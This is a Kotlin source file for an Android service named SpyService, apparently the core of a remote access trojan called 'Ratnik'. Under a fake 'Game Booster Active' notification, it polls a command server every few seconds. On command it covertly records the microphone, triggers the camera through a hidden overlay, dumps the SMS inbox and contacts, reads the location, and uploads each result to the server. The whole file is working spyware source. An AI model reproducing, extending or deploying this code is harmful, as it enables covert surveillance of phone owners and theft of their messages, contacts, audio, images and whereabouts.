package com.ratnik.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.PixelFormat
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.util.Log
import android.view.View
import android.view.WindowManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
    private val serverUrl = "http://127.0.0.1:8080" 

    override fun onCreate() {
        super.onCreate()
        val channelId = "ratnik_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Game Booster Active")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(1, notification)
            }
        }
        
        Thread {
            while (true) {
                try {
                    val request = Request.Builder().url("$serverUrl/ping").build()
                    client.newCall(request).execute().use { response ->
                        val body = response.body?.string() ?: ""
                        
                        if (body.contains("RECORD")) recordAudio()
                        else if (body.contains("SNAPSHOT")) triggerCameraInstantly()
                        else if (body.contains("PLAY_SOUND")) playLoudSound()
                        else if (body.contains("GET_SMS")) dumpSMS()
                        else if (body.contains("GET_CONTACTS")) dumpContacts()
                        else if (body.contains("GET_LOCATION")) getLocation()
                    }
                } catch (e: Exception) {
                    Log.e("RATNIK", "Ошибка пинга: ${e.message}")
                }
                Thread.sleep(3000)
            }
        }.start()
    }

    private fun triggerCameraInstantly() {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val params = WindowManager.LayoutParams(
            1, 1, 
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )
        
        val view = View(this)
        try { wm.addView(view, params) } catch (e: Exception) {}

        val intent = Intent(applicationContext, MainActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        intent.putExtra("SNAP", true)
        startActivity(intent)

        Handler(Looper.getMainLooper()).postDelayed({
            try { wm.removeView(view) } catch (e: Exception) {}
        }, 5000)
    }

    private fun recordAudio() {
        val file = File(cacheDir, "audio.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(10000)
            recorder.stop()
            recorder.release()
            uploadFile(file, "audio/m4a", "record.m4a")
        } catch (e: Exception) {
            recorder?.release()
        }
    }

    private fun playLoudSound() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
            val alert = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM))
            alert.play()
            Thread { Thread.sleep(15000); alert.stop() }.start()
        } catch (e: Exception) {}
    }

    private fun dumpSMS() {
        try {
            val smsList = JSONArray()
            val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    val date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
                    
                    val smsObj = JSONObject()
                    smsObj.put("from", address)
                    smsObj.put("text", body)
                    smsObj.put("date", date)
                    smsList.put(smsObj)
                } while (cursor.moveToNext())
                cursor.close()
            }
            val file = File(cacheDir, "sms.json")
            file.writeText(smsList.toString())
            uploadFile(file, "application/json", "sms.json")
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка SMS: ${e.message}")
        }
    }

    private fun dumpContacts() {
        try {
            val contactsList = JSONArray()
            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    
                    val contactObj = JSONObject()
                    contactObj.put("name", name)
                    contactObj.put("phone", phone)
                    contactsList.put(contactObj)
                } while (cursor.moveToNext())
                cursor.close()
            }
            val file = File(cacheDir, "contacts.json")
            file.writeText(contactsList.toString())
            uploadFile(file, "application/json", "contacts.json")
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка контактов: ${e.message}")
        }
    }

    private fun getLocation() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (location != null) {
                val locObj = JSONObject()
                locObj.put("lat", location.latitude)
                locObj.put("lon", location.longitude)
                
                val file = File(cacheDir, "location.json")
                file.writeText(locObj.toString())
                uploadFile(file, "application/json", "location.json")
            }
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка гео: ${e.message}")
        }
    }

    private fun uploadFile(file: File, mimeType: String, fileName: String) {
        try {
            val requestBody = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val multipartBody = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", fileName, requestBody).build()
            val request = Request.Builder().url("$serverUrl/upload").post(multipartBody).build()
            client.newCall(request).execute().use { }
            file.delete()
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
